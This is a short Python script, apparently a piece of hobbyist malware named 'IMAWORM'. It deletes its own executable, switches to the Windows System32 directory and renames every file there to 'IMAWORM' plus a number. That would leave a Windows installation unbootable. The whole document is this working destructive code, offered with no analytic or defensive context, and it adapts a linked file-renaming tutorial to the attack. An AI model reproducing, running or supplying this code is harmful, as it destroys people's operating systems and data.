import os, ctypes, sys
os.remove("IMAWORM.exe")

os.chdir("/Windows/System32")
#https://www.geeksforgeeks.org/rename-all-file-names-in-your-directory-using-python/
for count, f in enumerate(os.listdir()):
    f_name, f_ext = os.path.splitext(f)
    f_name = "IMAWORM" + str(count)
    
    new_name = f'{f_name}{f_ext}'
    os.rename(f, new_name)
